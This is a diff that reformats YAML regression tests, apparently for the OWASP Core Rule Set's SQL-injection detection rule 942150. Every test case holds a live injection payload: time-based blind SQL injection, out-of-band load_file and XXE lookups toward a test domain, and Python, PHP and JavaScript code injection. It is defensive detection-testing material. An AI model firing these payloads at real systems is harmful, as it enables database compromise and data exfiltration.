@@ -18,7 +18,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=SKLJDRTZWS89E450W49NQB0W45BN\x22=sleep(12)=\x22"
+          data: "var=SKLJDRTZWS89E450W49NQB0W45BN\x22=sleep(12)=\x22"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -35,7 +35,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=1' and sleep(9) #"
+          data: "var=1' and sleep(9) #"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -52,7 +52,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=1(select*from(select(sleep(5)))d)"
+          data: "var=1(select*from(select(sleep(5)))d)"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -69,7 +69,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=unittests@coreruleset.org' (function(){if(typeof foo===\x22undefined\x22){var a=new Date();do{var b=new Date();}while(b-a<20000);foo=1;}}()) '"
+          data: "var=unittests@coreruleset.org' (function(){if(typeof foo===\x22undefined\x22){var a=new Date();do{var b=new Date();}while(b-a<20000);foo=1;}}()) '"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -85,7 +85,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=test')and (select*from(select(sleep(10)))d)--"
+          data: "var=test')and (select*from(select(sleep(10)))d)--"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -102,7 +102,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=foo'||(select extractvalue(xmltype('<?xml version=\x221.1\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % tocob SYSTEM \x22https://unit'||'tests.coreruleset.org/\x22>%tocob;"
+          data: "var=foo'||(select extractvalue(xmltype('<?xml version=\x221.1\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % tocob SYSTEM \x22https://unit'||'tests.coreruleset.org/\x22>%tocob;"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -119,7 +119,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=config.ini' and sleep(91) #"
+          data: "var=config.ini' and sleep(91) #"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -136,7 +136,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=/config.txt' (select load_file('\x5c\x5c\x5c\x5cunittests.coreruleset.org\x5c\x5czow')) '"
+          data: "var=/config.txt' (select load_file('\x5c\x5c\x5c\x5cunittests.coreruleset.org\x5c\x5czow')) '"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -153,7 +153,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=None')and (select*from(select(sleep(10)))a)--"
+          data: "var=None')and (select*from(select(sleep(10)))a)--"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -170,7 +170,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=eval(compile('for x in range(1):\x5cn import time\x5cn time.sleep(12)','a','single'))"
+          data: "var=eval(compile('for x in range(1):\x5cn import time\x5cn time.sleep(12)','a','single'))"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -187,7 +187,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=file:/init.ini'.sleep(12).'"
+          data: "var=file:/init.ini'.sleep(12).'"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -204,7 +204,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=1)and (select*from(select(sleep(12)))a)-- : 1)and (select*from(select(sleep(12)))a)--"
+          data: "var=1)and (select*from(select(sleep(12)))a)-- : 1)and (select*from(select(sleep(12)))a)--"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -221,7 +221,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=(select load_file('\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5cunitests.corerule'||'set.org\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5chvs'))"
+          data: "var=(select load_file('\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5cunitests.corerule'||'set.org\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5chvs'))"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -238,7 +238,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=/path/to/file/config.ini')and (select*from(select(sleep(12)))a)--"
+          data: "var=/path/to/file/config.ini')and (select*from(select(sleep(12)))a)--"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -255,7 +255,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}"
+          data: "var=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -272,7 +272,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=test{${sleep(12)}}"
+          data: "var=test{${sleep(12)}}"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -289,7 +289,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=test\x22+eval(compile('for x in range(1):\x5cn import time\x5cn time.sleep(12)','a','single'))+\x22"
+          data: "var=test\x22+eval(compile('for x in range(1):\x5cn import time\x5cn time.sleep(12)','a','single'))+\x22"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -306,7 +306,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=test\x22+(function(){if(typeof gs78r==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);gs78r=1;}}())+\x22"
+          data: "var=test\x22+(function(){if(typeof gs78r==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);gs78r=1;}}())+\x22"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
@@ -323,7 +323,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=\x5cfoobar.txt\x22 or sleep(4) #"
+          data: "var=\x5cfoobar.txt\x22 or sleep(4) #"
           version: HTTP/1.0
         output:
           log_contains: id "942150"
